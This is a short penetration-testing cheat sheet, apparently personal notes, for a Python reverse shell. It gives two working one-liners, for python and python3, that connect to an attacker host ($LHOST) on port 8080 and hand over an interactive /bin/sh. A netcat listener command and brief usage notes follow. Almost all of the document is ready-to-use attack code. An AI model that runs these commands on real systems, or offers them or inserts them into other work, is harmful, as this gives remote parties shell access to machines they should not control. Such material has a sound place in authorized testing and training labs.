# Python Reverse Shell

A common reverse shell written in python. Used when `python` or `python3` is available on the target system.

Used on: **<Machine>**

## One-liner

<!-- cmd: cross-platform -->
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<!-- cmd: cross-platform -->
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Some systems may only have `python3` installed.
- Ensure `$LHOST` and port matches the listener.
